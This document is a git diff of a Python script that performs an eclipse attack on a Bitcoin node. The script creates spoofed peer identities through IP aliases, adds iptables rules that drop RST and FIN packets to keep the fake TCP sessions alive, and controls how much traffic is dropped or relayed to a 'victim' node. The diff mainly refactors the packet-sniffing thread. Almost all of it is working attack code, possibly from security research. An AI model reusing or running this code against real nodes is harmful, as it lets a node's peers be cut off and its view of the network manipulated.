@@ -1,10 +1,12 @@
 from _thread import start_new_thread
-from scapy.all import *
+#from scapy.all import *
 import socket
 import atexit
 import json
 import os
+import re
 import time
+import random
 import bitcoin
 from bitcoin.messages import *
 from bitcoin.net import CAddress
@@ -13,6 +15,10 @@ import hashlib
 
 import fcntl
 import struct 
+
+#pkt = Ether(b"\x08\x00'\x19\xef\xcd\x08\x00'\xa9;f\x08\x00E\x00\x00L&\xc0@\x00@\x06\xfb\x82\n\x00\x02\x04\n\x00\x02f \x8d\x17\x0f\xe5\xf4\xd8\xed\x9aj\x02\xbc\x80\x18\x01\xfd-\x9c\x00\x00\x01\x01\x08\n\xa0\xb9\xf5\xba\x8d\x16\xb3\x8a\xf9\xbe\xb4\xd9ping\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\xdf\x1fOV")
+#print(pkt)
+#sys.exit()
 
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0
@@ -94,17 +100,17 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	dst_port = victim_port
 	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
-	spoof_interface = ip_alias(src_ip)
-	identity_interface.append(spoof_interface)
-	if verbose: print(f'Successfully set up IP alias on interface {spoof_interface}')
+	interface = ip_alias(src_ip)
+	identity_interface.append(interface)
+	if verbose: print(f'Successfully set up IP alias on interface {interface}')
 	if verbose: print('Resulting ifconfig interface:')
-	if verbose: print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
+	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
 
 	if verbose: print('Setting up iptables configurations')
-	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
 
 	if verbose: print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -146,23 +152,31 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	identity_socket.append(s)
 
 	# Listen to the connections for future packets
-	if verbose: print('Attaching packet listener to {identity_interface}')
+	if verbose: print('Attaching packet listener to {interface}')
 	try:
 		start_new_thread(sniff, (), {
-			'iface': spoof_interface,
-			'prn': packet_received,
-			'filter': 'tcp',
-			'store': 1
+			'socket': s,
+			'src_ip': src_ip,
+			'src_port': src_port,
+			'dst_ip': dst_ip,
+			'dst_port': dst_port,
+			'interface': interface
 		})
 	except:
-		print('Error: unable to  start thread to sniff interface {spoof_interface}')
+		print('Error: unable to  start thread to sniff interface {interface}')
+
+def sniff(socket, src_ip, src_port, dst_ip, dst_port, interface):
+	while True:
+		packet = socket.recv(65565)
+		print(f'Packet: {packet}')
+		#packet_received(packet)
 
 # Called when a packet is sniffed from the network
 def packet_received(packet):
 	#packet.show()
 
 	msg_raw = bytes(packet[TCP].payload)
-	print('"' + str(packet) + '"')
+	#print('"' + str(packet) + '"')
 	if len(msg_raw) >= 4:
 		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
